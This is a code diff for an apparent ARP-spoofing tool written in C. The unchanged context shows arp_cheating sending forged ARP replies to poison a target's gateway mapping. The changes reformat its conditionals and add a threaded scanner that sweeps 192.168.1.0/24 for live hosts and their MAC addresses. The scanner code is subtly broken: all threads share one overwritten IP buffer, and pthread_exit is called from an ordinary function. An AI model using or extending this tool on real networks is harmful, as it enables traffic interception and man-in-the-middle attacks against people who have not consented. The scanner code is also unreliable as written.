@@ -393,7 +393,10 @@ int arp_cheating(char *dstip)
             }
             if (ar_op == ARPOP_REQUEST)
             {
-                if (!memcmp(recv_buf.src_ip, gw_ip, 4) || (!memcmp(recv_buf.src_ip, dst_ip, 4) && !memcmp(recv_buf.dst_ip, gw_ip, 4))) {
+                if (!memcmp(recv_buf.src_ip, gw_ip, 4) || 
+                    (!memcmp(recv_buf.src_ip, dst_ip, 4) && 
+                    !memcmp(recv_buf.dst_ip, gw_ip, 4))) 
+                {
                     printf("request\n");
                     sleep(1);
                     arp_request_send(fd, &addr, dst_ip, src_ip, src_mac);
@@ -401,7 +404,9 @@ int arp_cheating(char *dstip)
                             dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
                 }
             } else if (ar_op == ARPOP_REPLY) {
-                if (!memcmp(recv_buf.src_ip, dst_ip, 4) && !memcmp(recv_buf.dst_ip, src_ip, 4)) {
+                if (!memcmp(recv_buf.src_ip, dst_ip, 4) && 
+                    !memcmp(recv_buf.dst_ip, src_ip, 4)) 
+                {
                     arp_reply_send(fd, &addr, dst_ip, recv_buf.src_mac, gw_ip, src_mac);
                     printf("\033[0;35msuccess faked %d.%d.%d.%d\n\033[0m", 
                             (recv_buf.src_ip)[0], (recv_buf.src_ip)[1],
@@ -414,4 +419,53 @@ int arp_cheating(char *dstip)
     return 0;
 }
 
+static int scan_cnt = 0;
+pthread_mutex_t mtx;
+static void* get_mac(void *arg)
+{
+    unsigned char mac[6] = {0};
+    int tm = 0;
+    char ip[20] = {0};
+    char str_mac[20] = {0};
+    int len = 0;
 
+    if (arg == NULL) return NULL;
+    strcpy(ip, (char *)arg);
+    len = strlen(ip);
+    tm = get_net_mac(ip, mac, 5);
+    if (tm > 0) {
+        arr2mac(mac, str_mac);
+        printf("Host %s", ip);
+        len = 16 - len;
+        while (len-- >= 0) printf(" ");
+        printf("[%s] is up, used %d.%03ds.\n", str_mac, 
+                tm / 1000000, tm % 1000000);
+        pthread_mutex_lock(&mtx);
+        scan_cnt++;
+        pthread_mutex_unlock(&mtx);
+    }
+
+    return NULL;
+}
+
+/**
+ * @brief router_info 
+ */
+void router_info()
+{
+    pthread_t pt[255];
+    int i = 0;
+    char ip[20] = {0};
+
+    pthread_mutex_init(&mtx, NULL);
+    for (i = 1; i <= 255; i++)
+    {
+
+        sprintf(ip, "192.168.1.%d", i);
+        pthread_create(&pt[i - 1], NULL, get_mac, (void *)ip);
+        usleep(700);
+    }
+    pthread_exit(NULL);
+
+    return;
+}
